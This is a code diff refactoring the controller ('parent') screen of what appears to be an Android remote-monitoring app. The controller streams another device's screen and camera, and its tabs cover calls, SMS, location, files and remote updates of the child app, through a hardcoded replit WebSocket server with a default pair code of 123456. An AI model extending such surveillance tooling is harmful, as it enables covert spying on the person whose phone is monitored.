@@ -4,7 +4,6 @@ import android.content.SharedPreferences
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.view.View
 import android.widget.Button
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
@@ -15,46 +14,50 @@ import com.google.android.material.tabs.TabLayout
 import com.google.android.material.tabs.TabLayoutMediator
 import okhttp3.*
 import org.json.JSONObject
-import java.text.SimpleDateFormat
-import java.util.*
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
 
-    // ─── Fragment refs (set by each fragment in onViewCreated) ──────────────
+    companion object {
+        const val PREFS_NAME       = "config"
+        const val KEY_SERVER_URL   = "server_url"
+        const val KEY_PAIR_CODE    = "pair_code"
+        const val KEY_GITHUB_REPO  = "github_repo"
+        const val DEFAULT_URL      = "wss://bhai-secret--bs5129628.replit.app/api/ws"
+    }
+
+    // ─── Fragment refs ────────────────────────────────────────────────────────
     var dashboardFragment: DashboardFragment? = null
     var liveFragment:      LiveFragment?      = null
 
     // ─── Views ───────────────────────────────────────────────────────────────
-    private lateinit var tvStatus: TextView
-    private lateinit var tvBattery: TextView
-    private lateinit var tvPing: TextView
+    private lateinit var tvStatus:   TextView
+    private lateinit var tvBattery:  TextView
+    private lateinit var tvPing:     TextView
     private lateinit var btnNetToggle: Button
 
     // ─── WebSocket ───────────────────────────────────────────────────────────
-    private var ws: WebSocket? = null
+    private var ws:     WebSocket?    = null
     private var client: OkHttpClient? = null
     private val handler = Handler(Looper.getMainLooper())
-    private var pingInterval: Runnable? = null
     private var reconnectRunnable: Runnable? = null
+    private var pingInterval:      Runnable? = null
     private var connected = false
-    private var pingTs = 0L
+    private var pingTs    = 0L
 
     // ─── Prefs ───────────────────────────────────────────────────────────────
     private lateinit var prefs: SharedPreferences
-    private var serverUrl = "wss://bhai-secret--bs5129628.replit.app/api/ws"
+    private var serverUrl = DEFAULT_URL
     private var pairCode  = "123456"
-
-    // ─── State ───────────────────────────────────────────────────────────────
     private var netEnabled = true
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        prefs = getSharedPreferences("config", MODE_PRIVATE)
-        serverUrl = prefs.getString("server_url", serverUrl) ?: serverUrl
-        pairCode  = prefs.getString("pair_code",  pairCode)  ?: pairCode
+        prefs     = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+        serverUrl = prefs.getString(KEY_SERVER_URL, DEFAULT_URL) ?: DEFAULT_URL
+        pairCode  = prefs.getString(KEY_PAIR_CODE,  pairCode)    ?: pairCode
 
         bindViews()
         setupViewPager()
@@ -63,20 +66,19 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun bindViews() {
-        tvStatus    = findViewById(R.id.tvStatus)
-        tvBattery   = findViewById(R.id.tvBattery)
-        tvPing      = findViewById(R.id.tvPing)
-        btnNetToggle= findViewById(R.id.btnNetToggle)
+        tvStatus     = findViewById(R.id.tvStatus)
+        tvBattery    = findViewById(R.id.tvBattery)
+        tvPing       = findViewById(R.id.tvPing)
+        btnNetToggle = findViewById(R.id.btnNetToggle)
     }
 
     private fun setupViewPager() {
-        val pager  = findViewById<ViewPager2>(R.id.viewPager)
-        val tabs   = findViewById<TabLayout>(R.id.tabLayout)
-
-        val tabs_list = listOf("Dashboard","Live","Apps","Calls & SMS","Location","Files","Controls","Shizuku")
+        val pager = findViewById<ViewPager2>(R.id.viewPager)
+        val tabs  = findViewById<TabLayout>(R.id.tabLayout)
+        val tabTitles = listOf("Dashboard","Live","Apps","Calls & SMS","Location","Files","Controls","Shizuku","Settings")
 
         pager.adapter = object : FragmentStateAdapter(this) {
-            override fun getItemCount() = tabs_list.size
+            override fun getItemCount() = tabTitles.size
             override fun createFragment(pos: Int): Fragment = when (pos) {
                 0 -> DashboardFragment()
                 1 -> LiveFragment()
@@ -84,26 +86,27 @@ class MainActivity : AppCompatActivity() {
                 3 -> CallSmsFragment()
                 4 -> LocationFragment()
                 5 -> FilesFragment()
-                6 -> ControlsFragment()
+                6 -> ControlFragment()
                 7 -> ShizukuFragment()
+                8 -> SettingsFragment()
                 else -> DashboardFragment()
             }
         }
         pager.offscreenPageLimit = 2
-        TabLayoutMediator(tabs, pager) { tab, pos -> tab.text = tabs_list[pos] }.attach()
+        TabLayoutMediator(tabs, pager) { tab, pos -> tab.text = tabTitles[pos] }.attach()
     }
 
     private fun setupNetToggle() {
         btnNetToggle.setOnClickListener {
             netEnabled = !netEnabled
             val cmd = if (netEnabled) "wifi_on" else "wifi_off"
-            sendToChild(JSONObject().apply { put("command", cmd) })
+            sendCommand(cmd)
             btnNetToggle.text = if (netEnabled) "NET" else "NET✕"
             btnNetToggle.setBackgroundColor(if (netEnabled) 0xFF00E5FF.toInt() else 0xFFFF1744.toInt())
         }
     }
 
-    // ─── WebSocket connection ─────────────────────────────────────────────────
+    // ─── WebSocket ────────────────────────────────────────────────────────────
 
     fun connect() {
         if (client == null) {
@@ -112,27 +115,38 @@ class MainActivity : AppCompatActivity() {
                 .pingInterval(20, TimeUnit.SECONDS)
                 .build()
         }
-        val req = Request.Builder().url(serverUrl).build()
-        ws = client!!.newWebSocket(req, object : WebSocketListener() {
-            override fun onOpen(ws: WebSocket, res: Response) {
-                ws.send(JSONObject().apply {
-                    put("type", "register"); put("role", "parent"); put("pair_code", pairCode)
-                }.toString())
-            }
-            override fun onMessage(ws: WebSocket, text: String) {
-                try { handleMessage(JSONObject(text)) } catch (_: Exception) {}
-            }
-            override fun onClosing(ws: WebSocket, code: Int, reason: String) { setConnected(false) }
-            override fun onClosed(ws: WebSocket, code: Int, reason: String)  { setConnected(false); scheduleReconnect() }
-            override fun onFailure(ws: WebSocket, t: Throwable, res: Response?) { setConnected(false); scheduleReconnect() }
-        })
+        try {
+            val req = Request.Builder().url(serverUrl).build()
+            ws = client!!.newWebSocket(req, object : WebSocketListener() {
+                override fun onOpen(ws: WebSocket, res: Response) {
+                    ws.send(JSONObject().apply {
+                        put("type", "register")
+                        put("role", "parent")
+                        put("pair_code", pairCode)
+                    }.toString())
+                }
+                override fun onMessage(ws: WebSocket, text: String) {
+                    try { handleMessage(JSONObject(text)) } catch (_: Exception) {}
+                }
+                override fun onClosing(ws: WebSocket, code: Int, reason: String) { setConnected(false) }
+                override fun onClosed(ws: WebSocket, code: Int, reason: String)  { setConnected(false); scheduleReconnect() }
+                override fun onFailure(ws: WebSocket, t: Throwable, res: Response?) { setConnected(false); scheduleReconnect() }
+            })
+        } catch (_: Exception) { scheduleReconnect() }
+    }
+
+    fun reconnect(newUrl: String, newCode: String) {
+        serverUrl = newUrl; pairCode = newCode
+        ws?.close(1000, null); ws = null
+        reconnectRunnable?.let { handler.removeCallbacks(it) }
+        connect()
     }
 
     private fun handleMessage(msg: JSONObject) {
         when (msg.optString("type")) {
-            "auth_ok" -> handler.post { /* registered */ }
-            "peer_connected"    -> setConnected(true)
-            "peer_disconnected" -> setConnected(false)
+            "auth_ok"          -> { }
+            "peer_connected"   -> setConnected(true)
+            "peer_disconnected"-> setConnected(false)
             "pong" -> {
                 val ms = System.currentTimeMillis() - pingTs
                 handler.post {
@@ -140,14 +154,13 @@ class MainActivity : AppCompatActivity() {
                     dashboardFragment?.updatePing(ms)
                 }
             }
-            "screen_frame"  -> liveFragment?.onScreenFrame(msg.optString("frame"))
-            "camera_frame"  -> liveFragment?.onCameraFrame(msg.optString("frame"))
+            "screen_frame" -> liveFragment?.onScreenFrame(msg.optString("frame"))
+            "camera_frame" -> liveFragment?.onCameraFrame(msg.optString("frame"))
             "battery" -> {
-                val pct  = msg.optInt("battery", -1)
-                val chg  = msg.optBoolean("charging", false)
+                val pct = msg.optInt("battery", -1)
+                val chg = msg.optBoolean("charging", false)
                 handler.post {
-                    val label = "${pct}%${if (chg) "⚡" else ""}"
-                    tvBattery.text = label
+                    tvBattery.text = "${pct}%${if (chg) "⚡" else ""}"
                     dashboardFragment?.updateBattery(pct, chg)
                 }
             }
@@ -159,13 +172,24 @@ class MainActivity : AppCompatActivity() {
                 val pkg = msg.optString("package")
                 handler.post { dashboardFragment?.updateCurrentApp(pkg) }
             }
+            "update_result" -> {
+                val ok  = msg.optBoolean("success")
+                val ver = msg.optString("version", "")
+                val err = msg.optString("error", "")
+                handler.post {
+                    dashboardFragment?.addLog(
+                        if (ok) "🔄 Child updated to $ver successfully!"
+                        else    "❌ Update failed: $err"
+                    )
+                }
+            }
         }
     }
 
     private fun setConnected(on: Boolean) {
         connected = on
         handler.post {
-            tvStatus.text  = if (on) "Online" else "Offline"
+            tvStatus.text = if (on) "Online" else "Offline"
             tvStatus.setTextColor(if (on) 0xFF00C853.toInt() else 0xFFF44336.toInt())
             dashboardFragment?.updateOnline(on)
             if (on) startPinging() else stopPinging()
@@ -196,8 +220,18 @@ class MainActivity : AppCompatActivity() {
         pingInterval?.let { handler.removeCallbacks(it) }
     }
 
-    fun sendToChild(cmd: JSONObject) {
-        try { ws?.send(cmd.toString()) } catch (_: Exception) {}
+    // ─── Public send helpers (used by all fragments) ──────────────────────────
+
+    fun sendToChild(data: JSONObject) {
+        try { ws?.send(data.toString()) } catch (_: Exception) {}
+    }
+
+    fun sendCommand(command: String) {
+        sendToChild(JSONObject().apply { put("command", command) })
+    }
+
+    fun sendCommandObj(data: JSONObject) {
+        sendToChild(data)
     }
 
     override fun onDestroy() {
